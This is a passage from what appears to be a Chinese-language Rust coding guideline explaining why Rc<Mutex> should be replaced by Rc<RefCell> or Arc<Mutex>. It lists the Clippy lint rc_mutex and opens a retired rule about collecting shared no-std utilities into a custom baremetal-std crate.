<p><code>Rc</code> 是专门用于单线程的，多线程下应该用 <code>Arc</code> 。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::rc::Rc;
use std::sync::Mutex;
fn foo(interned: Rc&lt;Mutex&lt;i32&gt;&gt;) { ... }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::rc::Rc;
use std::sync::Arc;
use std::cell::RefCell
fn foo(interned: Rc&lt;RefCell&lt;i32&gt;&gt;) { ... }
// or
fn foo(interned: Arc&lt;Mutex&lt;i32&gt;&gt;) { ... }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#rc_mutex">rc_mutex</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
</tbody></table>
<h2 id="no-std"><a class="header" href="#no-std">no-std</a></h2>
<h3 id="pemb03--将一些公用的类型函数宏等集中到一个自定义的-baremetal-std"><a class="header" href="#pemb03--将一些公用的类型函数宏等集中到一个自定义的-baremetal-std">P.EMB.03  将一些公用的类型、函数、宏等集中到一个自定义的 <code>baremetal-std</code></a></h3>
<p><strong>淘汰原因</strong></p>
<p>最佳实践向，不该放到规范中。</p>
<p><strong>【描述】</strong></p>
<p>虽然 <code>no-std</code> 下不能用Rust 的标准库，但是可以自定义 <code>no-std</code> 下的标准库 <code>baremetal-std</code>，用于积累 <code>no-std</code> 下常用的公共库。</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        <script type="text/javascript" src="mermaid.min.js"></script>
        <script type="text/javascript" src="mermaid-init.js"></script>
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
    </body>
</html>
